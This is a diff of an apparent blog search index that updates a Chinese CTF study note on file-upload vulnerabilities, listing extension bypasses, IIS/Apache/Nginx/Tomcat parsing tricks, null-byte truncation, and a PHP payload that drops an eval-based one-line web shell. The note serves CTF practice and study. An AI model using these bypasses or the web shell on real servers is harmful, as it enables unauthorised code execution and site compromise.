@@ -203,8 +203,8 @@
         <category>CTF做题姿势总结</category>
       </categories>
       <tags>
-        <tag>CTF-AWD</tag>
         <tag>总结</tag>
+        <tag>CTF-AWD</tag>
       </tags>
   </entry>
   <entry>
@@ -329,7 +329,7 @@
   <entry>
     <title><![CDATA[CTF-Web【文件上传】漏洞做题姿势积累]]></title>
     <url>%2F2021%2F10%2F22%2FCTF-Web%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
-    <content type="text"><![CDATA[前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。 $_FILES属性 $_FILES[“file”][“name”] - 被上传文件的名称 $_FILES[“file”][“type”] - 被上传文件的类型 $_FILES[“file”][“size”] - 被上传文件的大小，以字节计 $_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称 $_FILES[“file”][“error”] - 由文件上传导致的错误代码 绕过 xif_imagetype()方式添加gif文件头 GIF89a %00截断上传漏洞php版本&lt;5.34 windows系统解析漏洞绕过1、上传1.php(或者图片马)，抓包改为1.php. 2、上传1.php(或者图片马)，抓包改为1.php::$DATA 3、上传1.php(或者图片马)，抓包改为1.php:1.jpg 4、上传1.php(或者图片马)，抓包改为1.php::$DATA……. 利用.user.ini文件进行上传 前提是当前上传的目录存在php文件]]></content>
+    <content type="text"><![CDATA[前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。 文件上传可解析后缀asp/aspx 1asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr php 1php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml jsp 1jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml 中间件解析漏洞iis 1234561.IIS6.0文件解析xx.asp;.jpg（服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了）2.IIS6.0目录解析xx.asp/1.jpg (服务器默认会把.asp，.asa目录下的文件都解析成asp文件。)3.IIS 7.0畸形解析 xxx.jpg/x.asp apache 1234561.%0a(CVE-2017-15715)（apache 2.4.0 - 2.4.29）更多姿势https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html2.未知后缀 test.php.xxx（Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断） nginx 123456789101112131415访问连接加/xxx.php test.jpg/.php (跟版本没有关系 属于配置不当)畸形解析漏洞 test.jpg%00.phpCVE-2013-4547（Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7）test.jpg(非编码空格)\0x.php www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\0.php另外一种手法：上传一个名字为test.jpg，以下内容的文件。&lt;?PHPfputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?phpeval($_POST[cmd])?&gt;&apos;);?&gt;然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 tomcat（仅限windows） 12345xxx.jsp/xxx.jsp%20xxx.jsp::$DATA 绕过 xif_imagetype()方式添加gif文件头 GIF89a 截断上传漏洞%00截断上传 php版本&lt;5.3.4 windows系统解析漏洞绕过1、上传1.php(或者图片马)，抓包改为1.php. 2、上传1.php(或者图片马)，抓包改为1.php::$DATA 3、上传1.php(或者图片马)，抓包改为1.php:1.jpg 4、上传1.php(或者图片马)，抓包改为1.php::$DATA……. 小技巧 利用.user.ini文件进行上传前提是当前上传的目录存在php文件 上传.htaccess (Apache) 更多 https://websec.readthedocs.io/zh/latest/vuln/fileupload.html]]></content>
       <categories>
         <category>CTF</category>
         <category>CTF做题姿势总结</category>
@@ -700,8 +700,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
         <tag>CTF</tag>
+        <tag>SQL注入</tag>
         <tag>二次注入</tag>
       </tags>
   </entry>
